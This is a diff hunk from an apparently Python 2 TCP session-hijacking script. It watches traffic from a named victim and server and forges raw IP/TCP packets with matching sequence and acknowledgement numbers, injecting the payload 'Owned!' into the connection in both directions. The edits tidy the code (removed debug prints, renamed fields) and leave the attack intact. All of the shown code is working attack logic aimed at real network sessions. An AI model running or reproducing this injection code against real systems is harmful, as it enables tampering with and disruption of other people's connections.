@@ -41,42 +41,36 @@ while True:
     
 
     if(sourceIP == victimIP):
-        # print "Destination MAC:" + binascii.hexlify(eth_header[0]) + " Source MAC:" + binascii.hexlify(
-        #     eth_header[1]) + " Type:" + binascii.hexlify(eth_header[2])
-        # print "Source IP:" + sourceIP + " Destination IP:" + destIP
-        # print "Source Port:" + str(sourcePort) + \
-        #     " Destination Port: "+str(destPort)
-        # print "seqNo: " + str(seqNo) + " ackNo: "+str(ackNo)
         print "received from victim"
         data = "Owned!"
         ip = IPPacket(destIP, sourceIP)
-        ip.assemble_ipv4_feilds()
+        ip.assemble_ipv4_fields()
         tcp = TCPPacket(destPort, sourcePort, destIP, sourceIP, seqNo, ackNo, 0,data)
-        tcp.assemble_tcp_feilds()
-        sock2.sendto(ip.raw+tcp.raw+struct.pack("!6s",data), (destIP, destPort))
+        tcp.assemble_tcp_fields()
+        sock2.sendto(ip.header+tcp.header+struct.pack("!6s",data), (destIP, destPort))
         print "packet sent to server\n\n"
 
         ip = IPPacket(sourceIP, destIP)
-        ip.assemble_ipv4_feilds()
+        ip.assemble_ipv4_fields()
         tcp = TCPPacket(sourcePort, destPort, sourceIP, destIP, ackNo, seqNo+totalLen, 1,data)
-        tcp.assemble_tcp_feilds()
-        sock2.sendto(ip.raw+tcp.raw+struct.pack("!6s",data), (sourceIP, sourcePort))
+        tcp.assemble_tcp_fields()
+        sock2.sendto(ip.header+tcp.header, (sourceIP, sourcePort))
         print "packet sent to victim\n\n"
     elif(sourceIP==serverIP):
         print "received from server"
         data = "Owned!"
         ip = IPPacket(sourceIP, destIP)
-        ip.assemble_ipv4_feilds()
+        ip.assemble_ipv4_fields()
         tcp = TCPPacket(sourcePort, destPort, sourceIP, destIP, ackNo, seqNo+totalLen, 0,data)
-        tcp.assemble_tcp_feilds()
-        sock2.sendto(ip.raw+tcp.raw+struct.pack("!6s",data), (sourceIP, sourcePort))
+        tcp.assemble_tcp_fields()
+        sock2.sendto(ip.header+tcp.header+struct.pack("!6s",data), (sourceIP, sourcePort))
         print "packet sent to server\n\n"
 
         ip = IPPacket(destIP, sourceIP)
-        ip.assemble_ipv4_feilds()
+        ip.assemble_ipv4_fields()
         tcp = TCPPacket(destPort, sourcePort, destIP, sourceIP, seqNo, ackNo, 1,data)
-        tcp.assemble_tcp_feilds()
-        sock2.sendto(ip.raw+tcp.raw+struct.pack("!6s",data), (destIP, destPort))
+        tcp.assemble_tcp_fields()
+        sock2.sendto(ip.header+tcp.header, (destIP, destPort))
         print "packet sent to victim\n\n"
 
 
